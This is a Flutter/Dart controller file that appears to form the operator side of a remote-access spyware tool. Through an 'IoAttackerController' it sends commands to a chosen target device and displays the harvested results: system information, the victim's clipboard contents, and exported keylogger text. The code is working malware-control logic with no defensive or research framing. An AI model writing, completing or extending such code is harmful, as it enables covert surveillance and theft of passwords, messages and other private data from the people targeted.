import 'package:flutter/material.dart';
import 'package:get/get.dart';

import '../../utils/utils.dart';
import 'io_attacker_controller.dart';

class GeneralController extends GetxController {
  RxInt selectedIndex = 0.obs;
  RxBool isClipboard = true.obs;
  RxString sysModelName = ''.obs, sysRam = ''.obs, sysOS = ''.obs;
  RxString clipboardData = 'No data'.obs, keyloggerData = ''.obs;

  final generalController = TextEditingController().obs;

  IoAttackerController ioAttackerController = Get.put(IoAttackerController());

  Future<void> getSystemInfo(String targetId) async {
    if (sysModelName.value == '') {
      try {
        Map<String, dynamic> response =
            await ioAttackerController.executeCommand(
          targetId: targetId,
          data: {"text": "GET_SYSTEM_INFO", "command_args": {}},
        );
        sysModelName.value = response["result"]["Node Name"];
        sysOS.value = response["result"]["OS"];
        sysRam.value = response["result"]["Total Memory"];
      } catch (e) {
        Utils.toastMsg("Error: $e");
      }
    }
  }

  Future<void> getClipboardData(String targetId) async {
    if (sysModelName.value == '') {
      try {
        Map<String, dynamic> response =
            await ioAttackerController.executeCommand(
          targetId: targetId,
          data: {"text": "GET_CLIPBOARD", "command_args": {}},
        );
        clipboardData.value = response["result"];
      } catch (e) {
        Utils.toastMsg("Error: $e");
      }
    }
  }

  Future<void> getKeyloggerData(String targetId) async {
    try {
      Map<String, dynamic> response = await ioAttackerController.executeCommand(
        targetId: targetId,
        data: {"text": "EXPORT_KEYLOG_TEXT", "command_args": {}},
      );
      if (response.containsKey("result") && response["result"].containsKey("text")) {
        keyloggerData.value = response["result"]["text"];
      } else {
        keyloggerData.value = "No keystrokes to export";
      }
    } catch (e) {
      Utils.toastMsg("Error: $e");
    }
  }
}
